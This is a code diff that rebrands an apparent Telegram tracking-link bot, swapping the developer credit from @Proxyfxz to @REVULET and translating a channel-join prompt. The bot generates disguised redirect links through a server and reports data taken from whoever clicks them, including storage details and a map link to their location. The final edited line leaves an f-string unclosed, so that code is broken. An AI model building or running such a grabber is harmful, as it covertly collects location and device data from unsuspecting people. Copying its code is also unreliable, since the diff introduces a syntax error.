@@ -185,7 +185,7 @@ def upload():
         f"   • Storage Total: {safe(data.get('storage_total'))} GB\n\n"
         f"🗺 **Map Link:**\n{map_link}\n"
         f"━━━━━━━━━━━━━━━━\n"
-        f"⚡ Developed by: @Proxyfxz"
+        f"⚡ Developed by: @REVULET"
     )
 
     try:
@@ -236,7 +236,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("✅ Verified (Start Again)", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
         ]
         await update.message.reply_text(
-            "❌ **Access Denied!**\n\nBot use karne ke liye aapko hamare **teenon** channels join karne honge.",
+            "❌ **Access Denied!**\n\nJOIN THE CHANNEL TO USE THE BOT.",
             reply_markup=InlineKeyboardMarkup(buttons)
         )
         return
@@ -263,7 +263,7 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     redir = urllib.parse.quote(url)
     link = f"{SERVER_URL}/?id={uid}&redir={redir}"
 
-    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`\n\n⚡ Powered by @Proxyfxz")
+    await update.message.reply_text(f"✅ **Tracking Link:**\n`{link}`\n\n⚡ Powered by @REVULET)
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
